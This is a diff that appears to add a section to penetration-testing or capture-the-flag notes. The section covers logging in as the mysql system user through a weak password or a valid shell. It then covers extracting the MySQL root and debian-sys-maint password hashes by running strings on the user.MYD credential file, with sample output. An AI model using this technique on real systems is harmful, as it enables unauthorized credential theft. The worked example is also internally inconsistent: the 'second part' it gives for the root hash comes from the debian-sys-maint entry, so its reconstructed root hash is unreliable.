@@ -10,3 +10,33 @@ Once you get access to the database, you should be able to navigate it using the
     select * from [TABLE];
 
 Where [DATABASE] and [TABLE] should be replaced by the value from the previous queries. 
+
+-----------------------------------------------Login as MYSQL------------------------------------------------
+
+There can exist issues like this one:
+- Trivial password.
+- The account has a valid shell instead of /bin/false.
+
+This should allow you to log in as the system user mysql.
+
+Once you're logged in, you can get access to the Mysql root password by running strings on the following file: 
+/var/lib/mysql/mysql/user.MYD.
+
+You should get 2 passwords:
+- debian-sys-maint
+- root
+
+The root password is likely splitted into two parts:
+    localhost
+root*8246FACFAA5BB9CFDCDEAEDA
+6c732c6044b7
+root
+    127.0.0.1
+root
+root
+    localhost
+debian-sys-maint*7B6D59ECDB7B791CF100CA46D0AD911082112351
+15DA4067EAA55FBC
+
+The first part is *8246FACFAA5BB9CFDCDEAEDA and the second part is 15DA4067EAA55FBC.
+root:*8246FACFAA5BB9CFDCDEAEDA15DA4067EAA55FBC
